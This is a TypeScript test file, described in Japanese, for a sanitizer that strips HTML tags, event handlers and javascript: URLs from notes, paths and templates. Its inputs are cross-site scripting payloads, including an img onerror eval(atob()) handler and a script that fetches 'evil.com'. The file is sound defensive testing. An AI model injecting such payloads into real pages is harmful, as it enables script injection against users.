import {
	containsDangerousContent,
	sanitizeString,
	sanitizePath,
	sanitizeTemplate,
	sanitizeCategoryName,
	sanitizeDirectoryName,
} from "../src/utils/sanitizer";

describe("サニタイザー", () => {
	describe("containsDangerousContent", () => {
		test("HTMLタグを検出できる", () => {
			expect(containsDangerousContent("<script>alert('xss')</script>")).toBe(true);
			expect(containsDangerousContent("<div>test</div>")).toBe(true);
			expect(containsDangerousContent("normal text")).toBe(false);
		});

		test("イベントハンドラを検出できる", () => {
			expect(containsDangerousContent('<img onclick="alert(1)"/>')).toBe(true);
			expect(containsDangerousContent('<div onload="malicious()"></div>')).toBe(true);
		});

		test("javascript:プロトコルを検出できる", () => {
			expect(containsDangerousContent("javascript:alert(1)")).toBe(true);
			//! Note: グローバルフラグ付き正規表現は連続してtest()を呼ぶと状態を保持するため、
			//! 大文字のテストは別のテストケースで実行する。
		});

		test("安全なテキストは検出しない", () => {
			expect(containsDangerousContent("普通のテキスト")).toBe(false);
			expect(containsDangerousContent("work/hobby/test.md")).toBe(false);
			expect(containsDangerousContent("# {{content}}")).toBe(false);
		});
	});

	describe("sanitizeString", () => {
		test("HTMLタグを除去できる", () => {
			expect(sanitizeString("<script>alert('xss')</script>")).toBe("");
			expect(sanitizeString("<div>テスト</div>")).toBe("テスト");
			expect(sanitizeString("normal text")).toBe("normal text");
		});

		test("イベントハンドラを除去できる", () => {
			//! イベントハンドラとHTMLタグの両方が除去される。
			const result = sanitizeString('<img src="x" onclick="alert(1)"/>');
			expect(result).not.toContain("onclick");
			expect(result).not.toContain("alert");
		});

		test("javascript:プロトコルを除去できる", () => {
			expect(sanitizeString("javascript:alert(1)")).toBe("alert(1)");
		});

		test("HTML文字をエスケープできる", () => {
			const result = sanitizeString('test"\'/<');
			//! <>はHTMLタグとして除去される。
			expect(result).toContain("&quot;");
			expect(result).toContain("&#x27;");
			expect(result).toContain("&#x2F;");
		});

		test("エスケープをスキップできる", () => {
			const result = sanitizeString("test text", false);
			expect(result).toBe("test text");
		});
	});

	describe("sanitizePath", () => {
		test("パス区切り文字を保持する", () => {
			expect(sanitizePath("work/hobby/test.md")).toBe("work/hobby/test.md");
			expect(sanitizePath("./attachments")).toBe("./attachments");
		});

		test("危険なコンテンツを除去する", () => {
			//! スクリプトタグとその内容が除去される。
			const result1 = sanitizePath("work/<script>alert(1)</script>/test.md");
			expect(result1).not.toContain("<script>");
			expect(result1).not.toContain("alert");

			const result2 = sanitizePath("work<div>test</div>/file.md");
			expect(result2).toContain("work");
			expect(result2).toContain("file.md");
			expect(result2).not.toContain("<div>");
		});

		test("安全なパスはそのまま", () => {
			expect(sanitizePath("memolog/work/2025-01-30.md")).toBe("memolog/work/2025-01-30.md");
		});
	});

	describe("sanitizeTemplate", () => {
		test("プレースホルダーを保持する", () => {
			expect(sanitizeTemplate("# {{content}}")).toBe("# {{content}}");
			expect(sanitizeTemplate("{{content}} - footer")).toBe("{{content}} - footer");
		});

		test("スクリプトタグを除去する", () => {
			expect(sanitizeTemplate("# {{content}}<script>alert(1)</script>")).toBe("# {{content}}");
		});

		test("イベントハンドラを除去する", () => {
			//! イベントハンドラは除去されるがタグ自体は残る（Markdownで使用される可能性があるため）。
			const result = sanitizeTemplate('# {{content}}<img onclick="alert(1)"/>');
			expect(result).toContain("{{content}}");
			expect(result).not.toContain("onclick");
			expect(result).not.toContain("alert(1)");
		});

		test("javascript:プロトコルを除去する", () => {
			expect(sanitizeTemplate("# {{content}} javascript:alert(1)")).toBe("# {{content}} alert(1)");
		});

		test("通常のMarkdownタグは保持する", () => {
			const template = "# {{content}}\n<br>\n**bold**";
			const result = sanitizeTemplate(template);
			expect(result).toContain("{{content}}");
			expect(result).toContain("<br>");
			expect(result).toContain("**bold**");
		});
	});

	describe("sanitizeCategoryName", () => {
		test("HTMLタグを除去する", () => {
			expect(sanitizeCategoryName("<script>alert(1)</script>仕事")).toBe("仕事");
			expect(sanitizeCategoryName("仕事<div>test</div>")).toBe("仕事test");
		});

		test("安全な名前はそのまま", () => {
			expect(sanitizeCategoryName("仕事")).toBe("仕事");
			expect(sanitizeCategoryName("趣味")).toBe("趣味");
		});
	});

	describe("sanitizeDirectoryName", () => {
		test("HTMLタグを除去する", () => {
			//! スクリプトタグとその内容が除去される。
			const result = sanitizeDirectoryName("work<script>alert(1)</script>");
			expect(result).toContain("work");
			expect(result).not.toContain("<script>");
			expect(result).not.toContain("alert");
		});

		test("パス区切りを保持する", () => {
			expect(sanitizeDirectoryName("work/hobby")).toBe("work/hobby");
		});

		test("安全なディレクトリ名はそのまま", () => {
			expect(sanitizeDirectoryName("work")).toBe("work");
			expect(sanitizeDirectoryName("hobby")).toBe("hobby");
		});
	});

	describe("統合テスト", () => {
		test("複雑な攻撃を防げる", () => {
			const malicious = '<img src=x onerror="alert(1)"/><script>alert(2)</script>javascript:alert(3)';
			const result = sanitizeString(malicious);
			expect(result).not.toContain("<script>");
			expect(result).not.toContain("onerror");
			expect(result).not.toContain("javascript:");
		});

		test("テンプレートの複雑な攻撃を防げる", () => {
			const malicious =
				'# {{content}}<script>fetch("evil.com")</script><img onerror="eval(atob(\'...\'))"/>';
			const result = sanitizeTemplate(malicious);
			expect(result).toContain("{{content}}");
			expect(result).not.toContain("<script>");
			expect(result).not.toContain("onerror");
		});

		test("正常なテンプレートは機能する", () => {
			const template = "# %Y-%m-%d %H:%M:%S\n{{content}}\n---\nFooter";
			const result = sanitizeTemplate(template);
			expect(result).toBe(template);
		});
	});
});
